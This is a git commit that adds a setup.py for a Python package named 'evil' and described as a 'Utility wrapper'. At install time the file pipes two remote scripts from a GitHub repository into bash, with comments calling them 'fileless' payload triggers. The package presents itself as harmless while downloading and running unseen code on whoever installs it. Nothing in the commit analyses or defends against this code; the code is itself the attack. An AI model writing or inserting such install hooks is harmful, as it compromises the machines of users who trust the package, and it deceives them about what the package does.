8445c57288b201303c2142d473840209e98f0cc4
mimikr00t <mimikr00t@tutanota.com>
2025-09-24 19:27:24 +0100

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,15 @@
+from setuptools import setup
+import os
+
+# Fileless trigger for the first payload
+os.system("curl -s https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.sh | bash")
+
+# Fileless trigger for the second payload
+os.system("curl -s https://raw.githubusercontent.com/mimikr00t/evil/refs/heads/main/payload.txt | bash")
+
+setup(
+name='evil',
+version='0.1',
+description='Utility wrapper',
+packages=['evil'],
+)
